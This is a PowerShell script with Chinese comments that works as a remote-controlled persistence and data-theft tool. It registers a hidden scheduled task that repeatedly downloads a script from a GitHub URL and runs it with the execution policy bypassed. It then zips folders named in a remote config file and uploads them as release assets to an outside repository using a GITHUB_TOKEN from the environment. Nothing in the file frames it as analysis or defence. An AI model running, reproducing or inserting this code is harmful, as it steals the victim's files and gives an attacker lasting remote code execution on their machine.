# 自动注册计划任务函数
function Register-MyTask {
    $taskName = "console"
    $scriptUrl = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/console.ps1"

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`""

    $trigger = New-ScheduledTaskTrigger -Daily -At "19:30"
    $trigger.RepetitionInterval = (New-TimeSpan -Minutes 30)
    $trigger.RepetitionDuration = (New-TimeSpan -Hours 4.5)

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Remote execute GitHub console.ps1" -Force
}

try {
    if (-not (Get-ScheduledTask -TaskName "console" -ErrorAction SilentlyContinue)) {
        Register-MyTask
        Write-Output "计划任务已注册！"
    }
} catch {
    Write-Warning "注册计划任务失败：$_"
}

# 上传脚本主逻辑
$token = $env:GITHUB_TOKEN
if ([string]::IsNullOrEmpty($token)) { return }

$repo = "ertgyhujkfghj/2"
$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
$pathConfigUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"

try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        return
    }
} catch {
    return
}

try {
    $pathsRaw = Invoke-RestMethod -Uri $pathConfigUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_ -and $_.Trim() -ne "" }
} catch {
    return
}

Add-Type -AssemblyName 'System.IO.Compression.FileSystem'

function Safe-Zip($src, $dst) {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($src, $dst)
}

foreach ($folder in $uploadPaths) {
    if (-Not (Test-Path $folder)) { continue }
    $tag = "upload-$(Split-Path $folder -Leaf)-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
    $zipPath = "$env:TEMP\upload_$(Get-Random).zip"

    try {
        Safe-Zip $folder $zipPath
    } catch {
        continue
    }

    $uploadUrl = "https://api.github.com/repos/$repo/releases"
    $headers = @{
        Authorization = "token $token"
        "User-Agent"  = "upload-script"
        Accept        = "application/vnd.github+json"
    }

    try {
        $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
            tag_name   = $tag
            name       = $tag
            draft      = $false
            prerelease = $false
        } | ConvertTo-Json -Depth 3)
    } catch {
        Remove-Item $zipPath -Force
        continue
    }

    $releaseId = $release.id
    $assetName = [System.IO.Path]::GetFileName($zipPath)
    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$releaseId/assets?name=$assetName"

    try {
        Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
            Authorization = "token $token"
            "Content-Type" = "application/zip"
            "User-Agent"   = "upload-script"
        } -InFile $zipPath
    } catch {
        # 忽略上传失败
    }

    Remove-Item $zipPath -Force
}
